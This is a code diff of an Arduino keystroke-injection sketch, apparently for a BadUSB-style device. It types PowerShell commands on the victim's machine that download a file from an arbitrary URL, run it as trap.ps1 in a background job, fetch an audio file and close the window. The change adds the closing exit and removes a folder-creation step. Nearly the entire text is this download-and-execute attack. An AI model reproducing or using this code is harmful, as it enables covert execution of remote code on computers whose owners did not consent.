@@ -37,20 +37,19 @@ void setup() {
   // Keyboard.press(121);
   Keyboard.press(KEY_Y);
   Keyboard.releaseAll();
-  delay(500);
+  delay(300);
 
   // Run PowerShell command: save file at $url as $file and execute it
   // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
   // Saves file to Users\$user filesystem root
-  Keyboard.print("mkdir .lint_info; cd .lint_info");
-  Keyboard.click(KEY_RETURN);
-  delay(100);
   Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';");
   Keyboard.print("$down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = 'trap.ps1'; $down.DownloadFile($url,$file);");
   Keyboard.print("$ride = '" + ride +"'; $ride_file = 'ride.wav'; $down.DownloadFile($ride,$ride_file);");
   delay(100);
   Keyboard.click(KEY_RETURN);
   Keyboard.print("Start-Job -ScriptBlock { ./trap.ps1 }");
+  Keyboard.click(KEY_RETURN);
+  Keyboard.print("exit;");
   Keyboard.click(KEY_RETURN);
 
 }
